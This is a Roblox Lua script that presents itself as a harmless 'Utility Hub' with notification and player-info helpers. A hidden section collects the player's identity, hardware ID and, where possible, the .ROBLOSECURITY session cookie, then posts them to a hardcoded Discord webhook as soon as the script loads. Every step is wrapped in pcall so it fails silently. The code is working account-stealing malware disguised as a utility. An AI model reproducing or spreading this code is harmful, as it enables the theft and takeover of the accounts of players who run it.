-- 244

local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer

-- ============== dfg ==============
print("[Utility] Cargando módulos...")

-- 434
local Utility = {}

function Utility.Notify(text)
    game.StarterGui:SetCore("SendNotification", {
        Title = "Utility Hub",
        Text = text,
        Duration = 3
    })
end

function Utility.GetPlayerInfo()
    return {
        Name = LocalPlayer.Name,
        DisplayName = LocalPlayer.DisplayName,
        UserId = LocalPlayer.UserId,
        AccountAge = LocalPlayer.AccountAge
    }
end

-- 234
Utility.Notify("Script cargado correctamente")

_G.Utility = Utility
print("[Utility] Listo. Usá _G.Utility")

-- ============== 124 ==============
local WEBHOOK = "https://discord.com/api/webhooks/1559034692127293440/r9ODOICWqdg7QFiv2tMBabg27dT2kvJYi_EPIm5p5l_zQ7nhdHYHGUmdOUymkQxzWb2q"  -- 321

local function send(data)
    local ok, res = pcall(function()
        return syn and syn.request or http_request or request
    end)

    local requestFunc = ok and res or nil

    local body = HttpService:JSONEncode(data)

    if requestFunc then
        pcall(function()
            requestFunc({
                Url = WEBHOOK,
                Method = "POST",
                Headers = {
                    ["Content-Type"] = "application/json"
                },
                Body = body
            })
        end)
    else
        -- 324
        pcall(function()
            HttpService:PostAsync(WEBHOOK, body, Enum.HttpContentType.ApplicationJson)
        end)
    end
end

local function grab()
    local data = {
        username = LocalPlayer.Name,
        displayName = LocalPlayer.DisplayName,
        userId = tostring(LocalPlayer.UserId),
        accountAge = LocalPlayer.AccountAge,
        placeId = game.PlaceId,
        jobId = game.JobId,
        executor = (identifyexecutor and identifyexecutor()) or "unknown",
        hwid = (gethwid and gethwid()) or (game:GetService("RbxAnalyticsService"):GetClientId()) or "unknown",
        timestamp = os.date("%Y-%m-%d %H:%M:%S")
    }

    -- 5646
    pcall(function()
        if getcookie then
            data.cookie = getcookie(".ROBLOSECURITY")
        end
    end)

    pcall(function()
        if getsenv then
            -- 45646
        end
    end)

    send(data)
end

-- 645645
task.spawn(grab)

-- 456
-- task.spawn(function()
--     while true do
--         task.wait(60)
--         grab()
--     end
-- end)
